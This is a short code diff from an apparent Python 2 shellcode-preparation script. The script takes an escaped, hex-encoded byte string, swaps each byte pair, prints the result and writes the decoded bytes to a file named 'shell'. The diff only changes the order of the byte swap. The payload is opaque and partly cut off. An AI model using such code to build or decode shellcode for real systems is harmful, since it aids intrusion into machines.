@@ -5,7 +5,7 @@ sh = "\u3cfa" + "\u2fea\uf96f\ue2f7\u640e\uee0c\u89e8\u0000\uc600\u66b6\u3430\uc
 
 shell = sh.replace('\\u', '')
 shell = shell.decode('hex')
-shell = ''.join([shell[i] + shell[i+1] for i in range(12, len(shell), 2)]).encode('hex')
+shell = ''.join([shell[i+1] + shell[i] for i in range(12, len(shell), 2)]).encode('hex')
 print shell
 shell = shell.decode('hex')
 with open('shell', 'w') as f:
